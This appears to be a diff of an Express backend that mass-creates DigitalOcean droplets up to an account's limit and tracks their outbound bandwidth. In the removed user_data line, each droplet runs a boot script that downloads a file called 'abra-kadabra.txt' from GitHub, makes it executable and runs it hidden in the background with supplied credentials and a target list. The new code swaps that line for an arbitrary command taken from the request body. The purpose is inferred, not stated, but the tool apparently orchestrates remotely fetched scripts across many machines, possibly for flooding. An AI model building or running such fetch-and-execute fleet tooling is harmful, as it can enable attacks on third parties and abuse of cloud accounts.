@@ -1,5 +1,6 @@
 const DigitalOcean = require("do-wrapper").default;
 const express = require('express')
+const path = require('path')
 const fetch = require('node-fetch')
 const PORT = process.env.PORT || 9898
 const app = express()
@@ -14,14 +15,34 @@ const token = '';
 
 const dateNow = () => Math.floor(Date.now() * 0.001)
 
-const getInstanceTemplate = ({login, password, names, name}) => {
+function delay(time) {
+  return new Promise(function(resolve) {
+      setTimeout(resolve, time)
+  });
+}
+
+app.use(express.static(path.join(__dirname, '../frontend/build/')))
+
+const staticHandler = function(req, res) {
+  const url = `${req.headers['x-forwarded-proto'] ? 'https://' : 'http://'}${req.hostname}${req.originalUrl}`;
+
+  const filePath = path.join(__dirname,'..','frontend','build','index.html');
+
+  res.sendFile(filePath);
+}
+
+
+app.get('/', staticHandler);
+
+const getInstanceTemplate = ({login, password, names, name, exec}) => {
+  console.log(`using command:\n${exec}`);
   if(names) {
     return JSON.stringify({
       "names": names,
       "region": "fra1",
       "size": "s-1vcpu-1gb",
       "image": "ubuntu-20-04-x64",
-      "user_data": `#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u ${login} -p ${password} -f list >/dev/null 2>&1 &`
+      "user_data": exec
     })
   }
 
@@ -31,7 +52,7 @@ const getInstanceTemplate = ({login, password, names, name}) => {
       "region": "fra1",
       "size": "s-1vcpu-1gb",
       "image": "ubuntu-20-04-x64",
-      "user_data": `#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u ${login} -p ${password} -f list >/dev/null 2>&1 &`
+      "user_data": exec
     })
   }
 }
@@ -70,7 +91,7 @@ app.get('/all', async (req, res) => {
 
 app.post('/fill/:prefix', async (req, res) => {
   const { prefix } = req.params;
-  const { creds } = req.body;
+  const { creds, exec } = req.body;
 
   let { droplets } = await requestDO('droplets?per_page=200', {
     headers: {
@@ -88,17 +109,11 @@ app.post('/fill/:prefix', async (req, res) => {
 
   const names = Array(Number(limit)).fill(1).map((c, x) => `${prefix}${x + 1}`)
 
-  console.log('droplet_limit', account.droplet_limit)
-  console.log('length', droplets.length)
-
   const chunks = names.slice(0, limit).reduce((all, one, i) => {
     const ch = Math.floor(i / 10);
     all[ch] = [].concat((all[ch] || []), one);
     return all
   }, [])
-
-  console.log('limit', limit)
-  console.log('chunks', chunks)
 
   let x = []
 
@@ -109,7 +124,7 @@ app.post('/fill/:prefix', async (req, res) => {
         Authorization: `Bearer ${req.headers['x-token']}`,
       },
       method: "POST",
-      body: getInstanceTemplate({...creds, names})
+      body: getInstanceTemplate({...creds, names, exec})
     })
 
     x.push(c)
@@ -148,7 +163,7 @@ app.get('/restart/:id/:name', async (req, res) => {
 
 app.post('/create/:name', async (req, res) => {
   const { name } = req.params;
-  const { creds } = req.body;
+  const { creds, exec } = req.body;
 
   const c = await requestDO('droplets', {
     headers: {
@@ -156,22 +171,20 @@ app.post('/create/:name', async (req, res) => {
       "Content-Type": "application/json",
     },
     method: "POST",
-    body: getInstanceTemplate({...creds, name})
+    body: getInstanceTemplate({...creds, name, exec})
   })
 
   res.send(c)
 })
 
 app.post('/createAll', async (req, res) => {
-  const { names, creds } = req.body;
+  const { names, creds, exec } = req.body;
 
   const chunks = names.reduce((all, one, i) => {
     const ch = Math.floor(i / 10);
     all[ch] = [].concat((all[ch] || []), one);
     return all
   }, [])
-
-  console.log(chunks)
 
   let x = []
 
@@ -182,7 +195,7 @@ app.post('/createAll', async (req, res) => {
         Authorization: `Bearer ${req.headers['x-token']}`,
       },
       method: "POST",
-      body: getInstanceTemplate({...creds, names})
+      body: getInstanceTemplate({...creds, names, exec})
     })
 
     x.push(c)
@@ -197,7 +210,7 @@ app.post('/perf', async (req, res) => {
   let r = []
 
   for (let id of droplets) {
-    let perf = await requestDO(`monitoring/metrics/droplet/bandwidth?host_id=${id}&interface=public&direction=inbound&start=${dateNow() - 60 * 30}&end=${dateNow()}`, {
+    let perf = await requestDO(`monitoring/metrics/droplet/bandwidth?host_id=${id}&interface=public&direction=outbound&start=${dateNow() - 60 * 30}&end=${dateNow()}`, {
       headers: {
         Authorization: `Bearer ${req.headers['x-token']}`,
       }
@@ -211,7 +224,7 @@ app.post('/perf', async (req, res) => {
 app.post('/perf/:id', async (req, res) => {
   const { id } = req.params;
 
-  let perf = await requestDO(`monitoring/metrics/droplet/bandwidth?host_id=${id}&interface=public&direction=inbound&start=${dateNow() - 60 * 30}&end=${dateNow()}`, {
+  let perf = await requestDO(`monitoring/metrics/droplet/bandwidth?host_id=${id}&interface=public&direction=outbound&start=${dateNow() - 60 * 30}&end=${dateNow()}`, {
     headers: {
       Authorization: `Bearer ${req.headers['x-token']}`,
     }
@@ -229,8 +242,6 @@ app.delete('/all', async (req, res) => {
   })
   droplets = droplets.map(d => d.id)
 
-  console.log(droplets)
-
   droplets.forEach(async (id) => {
     const d = await requestDO(`droplets/${id}`, {
       headers: {
@@ -238,9 +249,7 @@ app.delete('/all', async (req, res) => {
       },
       method: 'DELETE',
     })
-    console.log(`deleted ${id}`)
   })
-
 
   res.send('ok')
 })
@@ -255,11 +264,9 @@ app.delete('/:id', async (req, res) => {
     }
   })
 
-  console.log(`deleted ${id}`)
-
   res.send(req.params)
 })
 
 app.listen(PORT, () => {
-  console.log(`Example app listening on port ${PORT}`)
+  console.log(`Backend working on ${PORT}`)
 })
